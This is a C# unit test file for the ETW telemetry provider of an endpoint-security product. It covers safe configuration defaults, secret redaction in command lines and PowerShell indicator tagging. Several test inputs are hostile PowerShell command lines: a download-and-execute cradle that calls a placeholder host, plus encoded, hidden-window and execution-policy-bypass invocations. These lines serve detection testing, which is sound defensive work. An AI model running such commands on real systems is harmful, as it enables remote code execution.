using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using DataVanger.Classification;
using DataVanger.Core;
using DataVanger.Core.Abstractions;
using DataVanger.Core.Domain;
using DataVanger.Detection;
using DataVanger.Engine;
using DataVanger.Memory;
using DataVanger.Memory.Readers;
using DataVanger.Memory.Rules;
using DataVanger.Reputation;
using static DataVanger.Tests.Fixtures.PeFactory;

// Phase 09 decomposition — ETW Real Provider (Phase 2 / Step 05). Filter: ~Etw.
// Faithful move of the legacy mega-[Fact] section into an independently
// runnable, filterable [Fact]. Body is verbatim; the private Assert shim
// delegates to LegacyAssert.True so condition AND message are preserved.
public class EtwProviderTests
{
    private static void Assert(bool condition, string message) => LegacyAssert.True(condition, message);

    [Xunit.Fact]
    public async Task EtwRealProvider_AllLegacyChecks()
// 28. ETW Real Provider (Phase 2 / Step 05) — deterministic, development-safe
//     tests for ETW provider contracts, configuration, factory selection,
//     Null/InMemory providers, Windows skeleton degradation, runtime event
//     mapping, command-line sanitization, PowerShell indicator tagging, and
//     anti-FP guarantees. None of these tests may require admin, open a real
//     ETW session, start background loops, or depend on real process timing.
{
    static DataVanger.Engine.RuntimeEvents.InMemoryRuntimeEventPipeline NewPipeline()
        => new DataVanger.Engine.RuntimeEvents.InMemoryRuntimeEventPipeline();

    // 28a. EtwProviderConfiguration defaults are development-safe.
    {
        var dev = DataVanger.Shared.Etw.EtwProviderConfiguration.DevelopmentSafe();
        Assert(!dev.Enabled, "DevelopmentSafe config must be disabled by default.");
        Assert(!dev.AllowRealProvider, "DevelopmentSafe config must NOT allow the real provider.");
        Assert(dev.DevelopmentMode, "DevelopmentSafe config must report DevelopmentMode=true.");
        Assert(!dev.ForceRealProviderInDevelopment, "DevelopmentSafe must not force real provider in dev mode.");
        Assert(!dev.CaptureProcessStart && !dev.CaptureCommandLine && !dev.CapturePowerShellSignals,
            "DevelopmentSafe must not capture any signal by default.");
        Assert(dev.SanitizeCommandLines, "DevelopmentSafe must sanitize command lines by default.");

        var etwClamped = new DataVanger.Shared.Etw.EtwProviderConfiguration { MaxQueueSize = -5, MaxEventsPerSecond = 0 }
            .WithSafeDefaults();
        Assert(etwClamped.MaxQueueSize > 0, "WithSafeDefaults must clamp non-positive MaxQueueSize.");
        Assert(etwClamped.MaxEventsPerSecond > 0, "WithSafeDefaults must clamp non-positive MaxEventsPerSecond.");
    }

    // 28b. NullEtwRuntimeProvider lifecycle is safe and never publishes events.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        var provider = DataVanger.Infrastructure.Etw.EtwProviderFactory.CreateNull();
        Assert(provider.Status == DataVanger.Shared.Etw.EtwProviderStatus.Disabled,
            "Null provider must construct in Disabled state.");

        await provider.StartAsync();
        await provider.StartAsync(); // idempotent
        Assert(provider.Status == DataVanger.Shared.Etw.EtwProviderStatus.Disabled,
            "Null provider must remain Disabled after Start.");

        await provider.StopAsync();
        await provider.StopAsync(); // idempotent
        Assert(provider.Status == DataVanger.Shared.Etw.EtwProviderStatus.Stopped,
            "Null provider must transition to Stopped after Stop.");

        await provider.DisposeAsync().AsTask();
        await provider.DisposeAsync().AsTask(); // idempotent dispose

        Assert(consumer.Count == 0, "Null provider must never publish any runtime events.");
        var health = provider.GetHealth();
        Assert(health.ProviderName == "null-etw", "Null provider name must be 'null-etw'.");
        Assert(health.EventsPublished == 0 && health.EventsDropped == 0 && health.EventsFailed == 0,
            "Null provider must report zero event counters.");
    }

    // 28c. Factory selects safe defaults under every gating scenario.
    {
        using var runtimePipeline = NewPipeline();

        // Disabled config -> Null/Disabled.
        var p1 = DataVanger.Infrastructure.Etw.EtwProviderFactory.Create(runtimePipeline,
            DataVanger.Shared.Etw.EtwProviderConfiguration.DevelopmentSafe());
        Assert(p1 is DataVanger.Infrastructure.Etw.NullEtwRuntimeProvider, "Disabled config must yield a Null provider.");
        Assert(p1.Status == DataVanger.Shared.Etw.EtwProviderStatus.Disabled,
            "Disabled config Null provider must report Disabled.");
        await p1.DisposeAsync().AsTask();

        // Enabled + non-Windows -> Null/UnsupportedPlatform.
        var p2 = DataVanger.Infrastructure.Etw.EtwProviderFactory.Create(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = true,
                DevelopmentMode = false,
            },
            platformProbeOverride: () => false);
        Assert(p2 is DataVanger.Infrastructure.Etw.NullEtwRuntimeProvider,
            "Non-Windows host must yield a Null provider even when AllowRealProvider=true.");
        Assert(p2.Status == DataVanger.Shared.Etw.EtwProviderStatus.UnsupportedPlatform,
            "Non-Windows host must yield UnsupportedPlatform status.");
        await p2.DisposeAsync().AsTask();

        // Enabled + Windows + AllowRealProvider=false -> Null/NotConfigured.
        var p3 = DataVanger.Infrastructure.Etw.EtwProviderFactory.Create(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = false,
                DevelopmentMode = false,
            },
            platformProbeOverride: () => true);
        Assert(p3 is DataVanger.Infrastructure.Etw.NullEtwRuntimeProvider,
            "Disallowed real provider must yield a Null provider.");
        Assert(p3.Status == DataVanger.Shared.Etw.EtwProviderStatus.NotConfigured,
            "Disallowed real provider must yield NotConfigured status.");
        await p3.DisposeAsync().AsTask();

        // Enabled + Windows + AllowRealProvider + DevelopmentMode (no force) -> Null/NotConfigured.
        var p4 = DataVanger.Infrastructure.Etw.EtwProviderFactory.Create(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = true,
                DevelopmentMode = true,
                ForceRealProviderInDevelopment = false,
            },
            platformProbeOverride: () => true);
        Assert(p4 is DataVanger.Infrastructure.Etw.NullEtwRuntimeProvider,
            "Development mode without force must yield Null provider even on Windows.");
        Assert(p4.Status == DataVanger.Shared.Etw.EtwProviderStatus.NotConfigured,
            "Development mode without force must yield NotConfigured status.");
        await p4.DisposeAsync().AsTask();

        // All gates open -> WindowsEtwRuntimeProvider. Do not start it
        // here; real ETW startup is covered only by graceful degradation
        // tests that never open a session.
        var p5 = DataVanger.Infrastructure.Etw.EtwProviderFactory.Create(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = true,
                DevelopmentMode = false,
            },
            platformProbeOverride: () => true);
        Assert(p5 is DataVanger.Infrastructure.Etw.WindowsEtwRuntimeProvider,
            "All gates open must yield WindowsEtwRuntimeProvider.");
        Assert(p5.Status == DataVanger.Shared.Etw.EtwProviderStatus.Starting,
            "Open-gate Windows provider must construct in Starting status.");
        await p5.DisposeAsync().AsTask();
    }

    // 28d. InMemory provider publishes normalized process-start events through the pipeline.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        var provider = DataVanger.Infrastructure.Etw.EtwProviderFactory.CreateInMemory(runtimePipeline,
            DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests());
        await provider.StartAsync();
        Assert(provider.Status == DataVanger.Shared.Etw.EtwProviderStatus.Running,
            "Enabled InMemory provider must transition to Running after Start.");

        await provider.EmitProcessStart(new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
        {
            ProcessId = 4242,
            ParentProcessId = 100,
            ProcessName = "notepad.exe",
            ImagePath = @"C:\Windows\System32\notepad.exe",
            CommandLine = "notepad.exe foo.txt",
            TimestampUtc = new DateTimeOffset(2026, 5, 28, 12, 0, 0, TimeSpan.Zero),
            RawProviderName = "Microsoft-Windows-Kernel-Process",
            RawEventName = "Process/Start",
        }).AsTask();

        Assert(consumer.Count == 1, "InMemory provider must publish process-start through the pipeline.");
        var ev = consumer.Snapshot()[0];
        Assert(ev.Source == DataVanger.Shared.RuntimeEvents.RuntimeEventSource.EtwTelemetry,
            "ETW events must carry EtwTelemetry as source.");
        Assert(ev.Category == DataVanger.Shared.RuntimeEvents.RuntimeEventCategory.ProcessCreated,
            "Process-start must map to ProcessCreated category.");
        Assert(ev.Severity == DataVanger.Shared.RuntimeEvents.RuntimeEventSeverity.Informational,
            "Process-start without indicators must be Informational severity.");
        Assert(ev.ProcessId == 4242 && ev.ParentProcessId == 100 && ev.ProcessName == "notepad.exe",
            "Process metadata must be preserved.");
        Assert(ev.SubjectPath == @"C:\Windows\System32\notepad.exe",
            "Image path must populate SubjectPath.");
        Assert(ev.Metadata.ContainsKey(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MetaCommandLine),
            "Command line must appear in metadata when CaptureCommandLine=true.");

        await provider.StopAsync();
        await provider.DisposeAsync().AsTask();
    }

    // 28e. InMemory provider drops emissions when stopped, disposed, or disabled.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        var provider = DataVanger.Infrastructure.Etw.EtwProviderFactory.CreateInMemory(runtimePipeline,
            DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests());

        var obs = new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
        {
            ProcessId = 1, ProcessName = "a.exe", CommandLine = "a.exe",
        };

        // Before Start: await dropped.
        _ = provider.EmitProcessStart(obs).AsTask();  // CS4014: intentional fire-and-forget (original behaviour; result deliberately not observed here)
        Assert(consumer.Count == 0, "Pre-Start emissions must be dropped.");

        await provider.StartAsync();
        await provider.EmitProcessStart(obs).AsTask();
        Assert(consumer.Count == 1, "Running provider must publish.");

        await provider.StopAsync();
        await provider.EmitProcessStart(obs).AsTask();
        Assert(consumer.Count == 1, "Post-Stop emissions must be dropped.");

        await provider.DisposeAsync().AsTask();
        await provider.EmitProcessStart(obs).AsTask();
        Assert(consumer.Count == 1, "Post-Dispose emissions must be dropped.");

        var health = provider.GetHealth();
        Assert(health.EventsPublished == 1, "Health must reflect a single published event.");
        Assert(health.EventsDropped >= 3, "Health must count pre-Start, post-Stop, and post-Dispose drops.");
    }

    // 28f. Command-line sanitizer redacts secrets while preserving detection-relevant flags.
    {
        var input = @"powershell.exe -NoProfile -enc QQA= /password=hunter2 -token abc123 --apikey=ZZZ -w hidden";
        var sanitized = DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.Sanitize(input);
        Assert(!sanitized.Contains("hunter2"), "Sanitizer must redact /password=hunter2.");
        Assert(!sanitized.Contains("abc123"), "Sanitizer must redact -token abc123.");
        Assert(!sanitized.Contains("ZZZ"), "Sanitizer must redact --apikey=ZZZ.");
        Assert(sanitized.Contains("-enc"), "Sanitizer must preserve -enc for downstream detection.");
        Assert(sanitized.Contains("-w hidden"), "Sanitizer must preserve -w hidden for downstream detection.");
        Assert(sanitized.Contains("[REDACTED]"), "Sanitizer must replace secrets with [REDACTED].");

        Assert(DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.Sanitize(null) == string.Empty,
            "Sanitizer must return empty for null input.");
        Assert(DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.Sanitize("") == string.Empty,
            "Sanitizer must return empty for empty input.");

        var url = @"curl https://user:topsecret@host.example/path";
        var sanitizedUrl = DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.Sanitize(url);
        Assert(!sanitizedUrl.Contains("topsecret"), "Sanitizer must redact URL-embedded passwords.");
        Assert(sanitizedUrl.Contains("user:[REDACTED]@"), "Sanitizer must preserve scheme/user when redacting URL password.");

        // Length bound
        var huge = new string('A', DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.MaxCommandLineLength + 100);
        var truncated = DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.Sanitize(huge);
        Assert(truncated.Length == DataVanger.Infrastructure.Etw.EtwCommandLineSanitizer.MaxCommandLineLength,
            "Sanitizer must enforce MaxCommandLineLength.");
    }

    // 28g. PowerShell indicator detection tags encoded / hidden / dynamic execution.
    {
        var tagsEnc = DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.DetectIndicators(
            "powershell.exe", "powershell.exe -NoProfile -enc QQBC");
        Assert(tagsEnc.Contains(DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagPowerShellProcess),
            "PowerShell process must be tagged.");
        Assert(tagsEnc.Contains(DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagEncodedCommand),
            "-enc must tag encoded command.");

        var tagsHidden = DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.DetectIndicators(
            "pwsh.exe", "pwsh.exe -w hidden -Command Get-Process");
        Assert(tagsHidden.Contains(DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagHiddenWindow),
            "-w hidden must tag hidden window.");

        var tagsDyn = DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.DetectIndicators(
            "powershell.exe", "powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://x/y')");
        Assert(tagsDyn.Contains(DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagDynamicExecution),
            "IEX/DownloadString must tag dynamic execution.");

        var tagsBypass = DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.DetectIndicators(
            "powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File run.ps1");
        Assert(tagsBypass.Contains(DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagPolicyBypass),
            "-ExecutionPolicy Bypass must tag policy bypass.");

        // Non-PowerShell process must yield zero tags regardless of arguments.
        var tagsNone = DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.DetectIndicators(
            "notepad.exe", "notepad.exe -enc -w hidden iex");
        Assert(tagsNone.Count == 0, "Non-PowerShell process must NOT receive PowerShell indicator tags.");
    }

    // 28h. PowerShell indicator events flow through the InMemory provider and tag metadata.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        var provider = DataVanger.Infrastructure.Etw.EtwProviderFactory.CreateInMemory(runtimePipeline,
            DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests());
        await provider.StartAsync();

        await provider.EmitProcessStart(new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
        {
            ProcessId = 1234,
            ProcessName = "powershell.exe",
            ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine = "powershell.exe -NoProfile -w hidden -enc QQBCAA==",
            TimestampUtc = new DateTimeOffset(2026, 5, 28, 13, 0, 0, TimeSpan.Zero),
        }).AsTask();

        Assert(consumer.Count == 1, "PowerShell process-start must publish a single event.");
        var ev = consumer.Snapshot()[0];
        Assert(ev.Metadata.ContainsKey(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MetaIndicatorPrefix
            + DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagPowerShellProcess),
            "PowerShell process indicator must appear in metadata.");
        Assert(ev.Metadata.ContainsKey(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MetaIndicatorPrefix
            + DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagEncodedCommand),
            "Encoded command indicator must appear in metadata.");
        Assert(ev.Metadata.ContainsKey(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MetaIndicatorPrefix
            + DataVanger.Infrastructure.Etw.EtwPowerShellIndicators.TagHiddenWindow),
            "Hidden window indicator must appear in metadata.");
        Assert(ev.Severity == DataVanger.Shared.RuntimeEvents.RuntimeEventSeverity.Low,
            "Multiple PowerShell indicators must conservatively bump severity to Low (NEVER higher).");

        await provider.DisposeAsync().AsTask();
    }

    // 28i. Cancellation honored across emissions: no throw, no delivery, counted as dropped.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        var provider = DataVanger.Infrastructure.Etw.EtwProviderFactory.CreateInMemory(runtimePipeline,
            DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests());
        await provider.StartAsync();

        using var cts = new CancellationTokenSource();
        cts.Cancel();
        await provider.EmitProcessStart(new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
        {
            ProcessId = 9, ProcessName = "a.exe", CommandLine = "a.exe",
        }, cts.Token).AsTask();

        Assert(consumer.Count == 0, "Cancelled emissions must not deliver events.");
        await provider.DisposeAsync().AsTask();
    }

    // 28j. WindowsEtwRuntimeProvider degrades gracefully without requiring
    //      admin privileges or opening a real ETW session.
    {
        using var runtimePipeline = NewPipeline();
        var consumer = new DataVanger.Engine.RuntimeEvents.CollectingRuntimeEventConsumer();
        runtimePipeline.Subscribe(consumer);

        // Non-Windows host: must degrade to UnsupportedPlatform.
        var winNonHost = new DataVanger.Infrastructure.Etw.WindowsEtwRuntimeProvider(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = true,
                DevelopmentMode = false,
            },
            platformProbeOverride: () => false);
        Assert(winNonHost.Status == DataVanger.Shared.Etw.EtwProviderStatus.UnsupportedPlatform,
            "Non-Windows host must report UnsupportedPlatform.");
        await winNonHost.StartAsync();
        Assert(winNonHost.Status == DataVanger.Shared.Etw.EtwProviderStatus.UnsupportedPlatform,
            "Non-Windows host status must remain UnsupportedPlatform after Start.");
        await winNonHost.DisposeAsync().AsTask();

        // Open gates but no capture scopes: must degrade before opening
        // a TraceEvent session. This keeps the test deterministic and
        // independent of admin privileges.
        var winSimulated = new DataVanger.Infrastructure.Etw.WindowsEtwRuntimeProvider(runtimePipeline,
            new DataVanger.Shared.Etw.EtwProviderConfiguration
            {
                Enabled = true,
                AllowRealProvider = true,
                DevelopmentMode = false,
            },
            platformProbeOverride: () => true);
        Assert(winSimulated.Status == DataVanger.Shared.Etw.EtwProviderStatus.Starting,
            "Open-gate Windows provider must construct in Starting status.");
        await winSimulated.StartAsync();
        Assert(winSimulated.Status == DataVanger.Shared.Etw.EtwProviderStatus.ProviderUnavailable,
            "Windows provider must degrade to ProviderUnavailable when no capture scopes are enabled.");

        // Stop is idempotent and never await throws.
        _ = winSimulated.StopAsync();  // CS4014: intentional fire-and-forget (original behaviour; result deliberately not observed here)
        await winSimulated.StopAsync();
        Assert(winSimulated.Status == DataVanger.Shared.Etw.EtwProviderStatus.Stopped,
            "WindowsEtwRuntimeProvider must transition to Stopped after Stop.");

        var swDispose = System.Diagnostics.Stopwatch.StartNew();
        await winSimulated.DisposeAsync().AsTask();
        await winSimulated.DisposeAsync().AsTask();
        swDispose.Stop();
        Assert(swDispose.ElapsedMilliseconds < 1000,
            $"Dispose must not hang (took {swDispose.ElapsedMilliseconds}ms).");

        // Degraded startup emits health events through the pipeline, never raw process telemetry.
        var healthEvents = consumer.Snapshot();
        foreach (var he in healthEvents)
        {
            Assert(he.Source == DataVanger.Shared.RuntimeEvents.RuntimeEventSource.EtwTelemetry,
                "All Windows provider events in this deterministic path must be EtwTelemetry-sourced.");
            Assert(he.Category == DataVanger.Shared.RuntimeEvents.RuntimeEventCategory.HealthStatus,
                "Windows provider must only emit HealthStatus events in this deterministic degradation path.");
        }
    }

    // 28k. Anti-FP guarantee: ETW provider contracts expose no remediation surface,
    //      and runtime events emitted by ETW carry no quarantine/confirmation flags.
    {
        var iface = typeof(DataVanger.Infrastructure.Etw.IEtwRuntimeProvider);
        var members = iface.GetMembers()
            .Where(m =>
                m.Name.Contains("Quarantine", StringComparison.OrdinalIgnoreCase) ||
                m.Name.Contains("Kill", StringComparison.OrdinalIgnoreCase) ||
                m.Name.Contains("Block", StringComparison.OrdinalIgnoreCase) ||
                m.Name.Contains("Confirm", StringComparison.OrdinalIgnoreCase) ||
                m.Name.Contains("Suspend", StringComparison.OrdinalIgnoreCase) ||
                m.Name.Contains("Inject", StringComparison.OrdinalIgnoreCase))
            .ToArray();
        Assert(members.Length == 0,
            "IEtwRuntimeProvider must NOT expose remediation/verdict surfaces.");

        // EtwProviderConfiguration must not expose remediation toggles either.
        var cfgProps = typeof(DataVanger.Shared.Etw.EtwProviderConfiguration).GetProperties()
            .Where(p =>
                p.Name.Contains("Quarantine", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Kill", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Block", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Confirm", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Inject", StringComparison.OrdinalIgnoreCase))
            .ToArray();
        Assert(cfgProps.Length == 0,
            "EtwProviderConfiguration must NOT expose remediation toggles.");

        // Health DTO must not expose remediation either.
        var healthProps = typeof(DataVanger.Shared.Etw.EtwProviderHealth).GetProperties()
            .Where(p =>
                p.Name.Contains("Quarantine", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Confirm", StringComparison.OrdinalIgnoreCase))
            .ToArray();
        Assert(healthProps.Length == 0,
            "EtwProviderHealth must NOT expose remediation/verdict fields.");

        // A high-severity-looking PowerShell command line through the mapper must
        // never produce more than Severity=Low (telemetry, not verdict).
        var ev = DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MapProcessStart(
            new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
            {
                ProcessId = 1,
                ProcessName = "powershell.exe",
                CommandLine = "powershell.exe -enc QQBCAA== -w hidden -ep bypass iex 'evil'",
            },
            DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests());
        Assert(ev != null, "Mapper must produce an event for valid process-start.");
        Assert(ev!.Severity <= DataVanger.Shared.RuntimeEvents.RuntimeEventSeverity.Low,
            "ETW telemetry severity must NEVER exceed Low — telemetry is not a verdict.");
        Assert(ev.Source == DataVanger.Shared.RuntimeEvents.RuntimeEventSource.EtwTelemetry,
            "Mapper must source ETW telemetry as EtwTelemetry.");
    }

    // 28l. Mapper rejects unusable observations and respects capture toggles.
    {
        var cfg = DataVanger.Shared.Etw.EtwProviderConfiguration.InMemoryForTests();

        Assert(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MapProcessStart(null!, cfg) == null,
            "Mapper must return null for null observation.");
        Assert(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MapProcessStart(
                   new DataVanger.Infrastructure.Etw.EtwProcessStartObservation { ProcessId = 0 }, cfg) == null,
            "Mapper must return null for PID <= 0.");

        var disabledCli = new DataVanger.Shared.Etw.EtwProviderConfiguration
        {
            Enabled = true,
            CaptureProcessStart = true,
            CaptureCommandLine = false,
            SanitizeCommandLines = true,
        };
        var ev = DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MapProcessStart(
            new DataVanger.Infrastructure.Etw.EtwProcessStartObservation
            {
                ProcessId = 7, ProcessName = "x.exe", CommandLine = "x.exe /password=secret",
            },
            disabledCli);
        Assert(ev != null, "Process-start should still produce an event when only command line capture is off.");
        Assert(!ev!.Metadata.ContainsKey(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MetaCommandLine),
            "Command line must NOT appear in metadata when CaptureCommandLine=false.");

        // MapCommandLine must require CaptureCommandLine.
        Assert(DataVanger.Infrastructure.Etw.EtwRuntimeEventMapper.MapCommandLine(
                   new DataVanger.Infrastructure.Etw.EtwCommandLineObservation
                   {
                       ProcessId = 7, CommandLine = "x",
                   }, disabledCli) == null,
            "MapCommandLine must return null when CaptureCommandLine=false.");
    }
}

}
